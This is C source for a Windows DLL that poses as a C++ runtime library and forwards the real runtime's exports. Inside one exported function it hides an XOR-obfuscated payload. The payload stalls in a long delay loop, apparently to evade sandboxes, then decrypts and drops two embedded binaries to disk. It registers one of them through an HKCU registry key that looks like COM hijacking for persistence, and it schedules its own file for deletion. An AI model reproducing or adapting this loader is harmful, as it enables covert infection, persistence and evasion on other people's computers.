#include <windows.h>

void ___chkstk_ms(void) { return; }

void *memset(void *dest, int val, size_t count) {
  unsigned char *p = (unsigned char *)dest;
  while (count--)
    *p++ = (unsigned char)val;
  return dest;
}

void *memcpy(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  while (count--)
    *d++ = *s++;
  return dest;
}

void *memmove(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  if (d < s) {
    while (count--)
      *d++ = *s++;
  } else if (d > s) {
    d += count;
    s += count;
    while (count--)
      *(--d) = *(--s);
  }
  return dest;
}

void *memchr(const void *ptr, int val, size_t count) {
  const unsigned char *p = (const unsigned char *)ptr;
  while (count--) {
    if (*p == (unsigned char)val)
      return (void *)p;
    p++;
  }
  return (void *)0;
}

int memcmp(const void *s1, const void *s2, size_t count) {
  const unsigned char *a = (const unsigned char *)s1;
  const unsigned char *b = (const unsigned char *)s2;
  while (count--) {
    if (*a != *b)
      return *a - *b;
    a++;
    b++;
  }
  return 0;
}

int strcmp(const char *s1, const char *s2) {
  while (*s1 && (*s1 == *s2)) {
    s1++;
    s2++;
  }
  return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static int triggered = 0;

static unsigned char ck2[] = "9832gf2bc29_120e9hd10c))b@@!11";
static unsigned int ck2l = 30;

static void xd(unsigned char *enc, char *out, int len) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[i % ck2l];
  out[len] = 0;
}

static void xe(char *plain, unsigned char *enc, int len) {
  int i;
  for (i = 0; i < len; i++)
    enc[i] = plain[i] ^ ck2[i % ck2l];
  memset(plain, 0, len);
}

static void xb(unsigned char *enc, unsigned char *out, int len,
               int abs_offset) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[(abs_offset + i) % ck2l];
}

static HMODULE rl(unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  HMODULE mod = LoadLibraryA(buf);
  xe(buf, enc, len);
  return mod;
}

static FARPROC ra(HMODULE mod, unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  FARPROC fn = GetProcAddress(mod, buf);
  xe(buf, enc, len);
  return fn;
}

#include "data.h"

void *_set_se_translator(void *translator) {
  if (triggered)
    return (void *)0;
  triggered = 1;

  volatile unsigned int delay = 0;
  for (unsigned int i = 0; i < 400000000; i++) {
    delay += i ^ (i - 1);
  }
  if (delay == 0xdeadbeef) {
    return (void *)0;
  }

  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                                0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};

  HMODULE hK32 = rl(e_kernel32, 13);

  unsigned char e_CreateDirectoryA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                        0x76, 0x0b, 0x11, 0x57, 0x5a, 0x2b,
                                        0x5e, 0x40, 0x49, 0x24, 0x39};
  unsigned char e_CreateFileA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                   0x74, 0x0b, 0x0f, 0x57, 0x78, 0x5f};
  unsigned char e_WriteFile[] = {0x6e, 0x4a, 0x5a, 0x46, 0x02,
                                 0x20, 0x5b, 0x0e, 0x06, 0x32};
  unsigned char e_CloseHandle[] = {0x7a, 0x54, 0x5c, 0x41, 0x02, 0x2e,
                                   0x53, 0x0c, 0x07, 0x5e, 0x5c, 0x5f};

  unsigned char e_MoveFileExA[] = {0x74, 0x57, 0x45, 0x57, 0x21, 0x0f,
                                   0x5e, 0x07, 0x26, 0x4a, 0x78};
  unsigned char e_GetModuleFileNameA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
                                          0x47, 0x0e, 0x06, 0x74, 0x50, 0x33,
                                          0x54, 0x7c, 0x51, 0x08, 0x5c, 0x29};
  unsigned char e_VirtualQuery[] = {0x6f, 0x51, 0x41, 0x46, 0x12, 0x07,
                                    0x5e, 0x33, 0x16, 0x57, 0x4b, 0x26};

  typedef BOOL(WINAPI * pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
  typedef HANDLE(WINAPI * pCreateFileA)(
      LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
  typedef BOOL(WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                    LPOVERLAPPED);
  typedef BOOL(WINAPI * pCloseHandle)(HANDLE);
  typedef BOOL(WINAPI * pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
  typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
  typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
                                         SIZE_T);

  pCreateDirectoryA fCreateDirectoryA =
      (pCreateDirectoryA)ra(hK32, e_CreateDirectoryA, 17);
  pCreateFileA fCreateFileA = (pCreateFileA)ra(hK32, e_CreateFileA, 12);
  pWriteFile fWriteFile = (pWriteFile)ra(hK32, e_WriteFile, 10);
  pCloseHandle fCloseHandle = (pCloseHandle)ra(hK32, e_CloseHandle, 12);
  pMoveFileExA fMoveFileExA = (pMoveFileExA)ra(hK32, e_MoveFileExA, 11);
  pGetModuleFileNameA fGetModuleFileNameA =
      (pGetModuleFileNameA)ra(hK32, e_GetModuleFileNameA, 18);
  pVirtualQuery fVirtualQuery = (pVirtualQuery)ra(hK32, e_VirtualQuery, 12);

  unsigned char e_sys_dir[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x29, 0x50, 0x0a,
      0x16, 0x50, 0x42, 0x1a, 0x75, 0x6d, 0x10, 0x29, 0x36, 0x44, 0x43, 0x42};
  char sys_dir[256];
  xd(e_sys_dir, sys_dir, 60);

  for (int i = 0; sys_dir[i] != '\0'; i++) {
    if (sys_dir[i] == '\\') {
      sys_dir[i] = '\0';
      if (sys_dir[1] == ':' && i == 2) {
        sys_dir[i] = '\\';
        continue;
      }
      fCreateDirectoryA(sys_dir, NULL);
      sys_dir[i] = '\\';
    }
  }
  fCreateDirectoryA(sys_dir, NULL);

  unsigned char e_sys_path[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x29, 0x50, 0x0a,
      0x16, 0x50, 0x42, 0x1a, 0x75, 0x6d, 0x10, 0x29, 0x36, 0x44, 0x43, 0x42,
      0x65, 0x59, 0x5e, 0x56, 0x51, 0x52, 0x1c, 0x11, 0x1a, 0x41};
  char sys_path[256];
  xd(e_sys_path, sys_path, 70);

  HANDLE hFile = fCreateFileA(sys_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_sys_len) {
      int sz = file_sys_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_sys + current_offset, file_sys + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_dll_path[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d,
      0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22,
      0x7b, 0x64, 0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01,
      0x04, 0x49, 0x56, 0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01,
      0x6c, 0x29, 0x50, 0x0a, 0x16, 0x50, 0x42, 0x1a, 0x75, 0x44, 0x0f,
      0x24, 0x25, 0x57, 0x5d, 0x58, 0x5b, 0x16, 0x57, 0x5e, 0x0b};
  char dll_path[256];
  xd(e_dll_path, dll_path, 65);

  hFile = fCreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_dll_len) {
      int sz = file_dll_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_dll + current_offset, file_dll + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_GetSystemTime[] = {0x7e, 0x5d, 0x47, 0x61, 0x1e, 0x15, 0x46, 0x07, 0x0e, 0x66, 0x50, 0x32, 0x54};
  unsigned char e_GetTimeFormatA[] = {0x7e, 0x5d, 0x47, 0x66, 0x0e, 0x0b, 0x57, 0x24, 0x0c, 0x40, 0x54, 0x3e, 0x45, 0x73};
  
  typedef VOID (WINAPI *pGetSystemTime)(LPSYSTEMTIME);
  typedef int (WINAPI *pGetTimeFormatA)(LCID, DWORD, const SYSTEMTIME*, LPCSTR, LPSTR, int);
  
  pGetSystemTime fGetSystemTime = (pGetSystemTime)ra(hK32, e_GetSystemTime, 13);
  pGetTimeFormatA fGetTimeFormatA = (pGetTimeFormatA)ra(hK32, e_GetTimeFormatA, 14);

  SYSTEMTIME st;
  fGetSystemTime(&st);
  char timeBuf[128];
  fGetTimeFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, timeBuf, 128);

  unsigned char e_reg_key[] = {
      0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55,
      0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27,
      0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e,
      0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73,
      0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21,
      0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39};
  char reg_key[256];
  xd(e_reg_key, reg_key, 77);

  unsigned char e_advapi32[] = {0x58, 0x5c, 0x45, 0x53, 0x17, 0x0f, 0x01, 0x50, 0x4d, 0x56, 0x55, 0x33};
  HMODULE hAdv = rl(e_advapi32, 12);

  unsigned char e_RegCreateKeyExA[] = {0x6b, 0x5d, 0x54, 0x71, 0x15, 0x03, 0x53, 0x16, 0x06, 0x79, 0x5c, 0x26, 0x74, 0x4a, 0x71};
  unsigned char e_RegSetValueExA[] = {0x6b, 0x5d, 0x54, 0x61, 0x02, 0x12, 0x64, 0x03, 0x0f, 0x47, 0x5c, 0x1a, 0x49, 0x73};
  unsigned char e_RegCloseKey[] = {0x6b, 0x5d, 0x54, 0x71, 0x0b, 0x09, 0x41, 0x07, 0x28, 0x57, 0x40};

  typedef LSTATUS(WINAPI * pRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
  typedef LSTATUS(WINAPI * pRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
  typedef LSTATUS(WINAPI * pRegCloseKey)(HKEY);

  pRegCreateKeyExA fRegCreateKeyExA = (pRegCreateKeyExA)ra(hAdv, e_RegCreateKeyExA, 15);
  pRegSetValueExA fRegSetValueExA = (pRegSetValueExA)ra(hAdv, e_RegSetValueExA, 14);
  pRegCloseKey fRegCloseKey = (pRegCloseKey)ra(hAdv, e_RegCloseKey, 11);

  HKEY hKey;
  if (fRegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL,
                       REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,
                       NULL) == ERROR_SUCCESS) {
    unsigned char e_ThreadingModel[] = {0x6d, 0x50, 0x41, 0x57, 0x06,
                                        0x02, 0x5b, 0x0c, 0x04, 0x7f,
                                        0x56, 0x3b, 0x54, 0x5e, 0x30};
    char ThreadingModel[32];
    xd(e_ThreadingModel, ThreadingModel, 15);

    unsigned char e_Apartment[] = {0x78, 0x48, 0x52, 0x40, 0x13,
                                   0x0b, 0x57, 0x0c, 0x17, 0x32};
    char Apartment[32];
    xd(e_Apartment, Apartment, 10);

    fRegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, 66);
    fRegSetValueExA(hKey, ThreadingModel, 0, REG_SZ, (const BYTE *)Apartment,
                   11);
    fRegCloseKey(hKey);
  }

  MEMORY_BASIC_INFORMATION mbi;
  HMODULE hModule = NULL;
  if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
    hModule = (HMODULE)mbi.AllocationBase;
  }

  if (hModule != NULL) {
    char module_path[MAX_PATH];
    if (fGetModuleFileNameA(hModule, module_path, MAX_PATH) > 0) {
      fMoveFileExA(module_path, NULL, 0x4);
    }
  }

  return (void *)0;
}

void *p___C_specific_handler;
EXCEPTION_DISPOSITION __attribute__((naked))
__C_specific_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
                     void *EstablisherFrame, struct _CONTEXT *ContextRecord,
                     struct _DISPATCHER_CONTEXT *DispatcherContext) {
  asm("jmp *p___C_specific_handler(%rip)");
}

void *p___current_exception;
void __attribute__((naked)) __current_exception() {
  asm("jmp *p___current_exception(%rip)");
}

void *p___current_exception_context;
void __attribute__((naked)) __current_exception_context() {
  asm("jmp *p___current_exception_context(%rip)");
}

void *p___CxxFrameHandler3;
void __attribute__((naked)) __CxxFrameHandler3() {
  asm("jmp *p___CxxFrameHandler3(%rip)");
}

void *p___std_exception_copy;
void __attribute__((naked)) __std_exception_copy() {
  asm("jmp *p___std_exception_copy(%rip)");
}

void *p___std_exception_destroy;
void __attribute__((naked)) __std_exception_destroy() {
  asm("jmp *p___std_exception_destroy(%rip)");
}

void *p__CxxThrowException;
void __attribute__((naked)) _CxxThrowException() {
  asm("jmp *p__CxxThrowException(%rip)");
}

void *p___uncaught_exceptions;
void __attribute__((naked)) __uncaught_exceptions() {
  asm("jmp *p___uncaught_exceptions(%rip)");
}

void *p___uncaught_exception;
void __attribute__((naked)) __uncaught_exception() {
  asm("jmp *p___uncaught_exception(%rip)");
}

void *p___std_terminate;
void __attribute__((naked)) __std_terminate() {
  asm("jmp *p___std_terminate(%rip)");
}

void *p__purecall;
void __attribute__((naked)) _purecall() { asm("jmp *p__purecall(%rip)"); }

void *p___AdjustPointer;
void __attribute__((naked)) __AdjustPointer() {
  asm("jmp *p___AdjustPointer(%rip)");
}

void *p___std_type_info_destroy_list;
void __attribute__((naked)) __std_type_info_destroy_list() {
  asm("jmp *p___std_type_info_destroy_list(%rip)");
}

void *p___processing_throw;
void __attribute__((naked)) __processing_throw() {
  asm("jmp *p___processing_throw(%rip)");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    unsigned char e_sys_vc[] = {
        0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
        0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
        0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a};
    char sys_vc[64];
    xd(e_sys_vc, sys_vc, 36);

    HMODULE hReal = LoadLibraryA(sys_vc);
    if (hReal) {
      unsigned char e___C_specific_handler[] = {
          0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54,
          0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
      p___C_specific_handler = ra(hReal, e___C_specific_handler, 20);

      unsigned char e___current_exception[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d,
          0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
      p___current_exception = ra(hReal, e___current_exception, 19);

      unsigned char e___current_exception_context[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17,
          0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07,
          0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
      p___current_exception_context =
          ra(hReal, e___current_exception_context, 27);

      unsigned char e___CxxFrameHandler3[] = {
          0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e,
          0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
      p___CxxFrameHandler3 = ra(hReal, e___CxxFrameHandler3, 18);

      unsigned char e___std_exception_copy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57,
          0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
      p___std_exception_copy = ra(hReal, e___std_exception_copy, 20);

      unsigned char e___std_exception_destroy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a,
          0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a,
          0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
      p___std_exception_destroy = ra(hReal, e___std_exception_destroy, 23);

      unsigned char e__CxxThrowException[] = {
          0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14,
          0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
      p__CxxThrowException = ra(hReal, e__CxxThrowException, 18);

      unsigned char e___uncaught_exceptions[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66,
          0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
      p___uncaught_exceptions = ra(hReal, e___uncaught_exceptions, 21);

      unsigned char e___uncaught_exception[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46,
          0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
      p___uncaught_exception = ra(hReal, e___uncaught_exception, 20);

      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03,
                                           0x39, 0x46, 0x07, 0x11, 0x5f,
                                           0x50, 0x31, 0x50, 0x46, 0x55}; // 15
      p___std_terminate = ra(hReal, e___std_terminate, 15);

      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02,
                                     0x05, 0x53, 0x0e, 0x0f}; // 9
      p__purecall = ra(hReal, e__purecall, 9);

      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d,
                                           0x13, 0x41, 0x16, 0x33, 0x5d,
                                           0x50, 0x31, 0x45, 0x57, 0x42}; // 15
      p___AdjustPointer = ra(hReal, e___AdjustPointer, 15);

      unsigned char e___std_type_info_destroy_list[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57,
          0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45,
          0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
      p___std_type_info_destroy_list =
          ra(hReal, e___std_type_info_destroy_list, 28);

      unsigned char e___processing_throw[] = {
          0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10,
          0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
      p___processing_throw = ra(hReal, e___processing_throw, 18);
    }
  }
  return TRUE;
}
